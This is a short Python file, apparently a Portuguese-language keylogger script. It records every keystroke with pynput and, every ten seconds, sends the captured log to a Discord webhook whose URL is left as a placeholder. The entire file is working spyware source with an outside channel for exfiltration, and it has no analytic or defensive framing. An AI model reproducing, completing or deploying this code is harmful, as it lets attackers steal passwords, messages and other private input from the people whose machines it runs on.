from dhooks import Webhook
from threading import Timer

from pynput.keyboard import Listener

HOOK_URL = 'URL DO CANAL DO DISCORD'
INTERVALO = 10

class Keylogger:
    def __init__(self, weebhook_url, intervalo):
        self.intervalo = intervalo
        self.weebhook_url = Webhook(weebhook_url)
        self.log = ""

    def envio_report(self):
        if self.log != "":
            self.weebhook_url.send(self.log)
            self.log = ""
        Timer(self.intervalo, self.envio_report).start()
    
    def press(self, key):
        self.log += str(key)

    def run(self):
        print("Keylogger run")
        self.envio_report()
        with Listener(self.press) as l:
            l.join()

if __name__ == '__main__':
    Keylogger(HOOK_URL, INTERVALO).run()
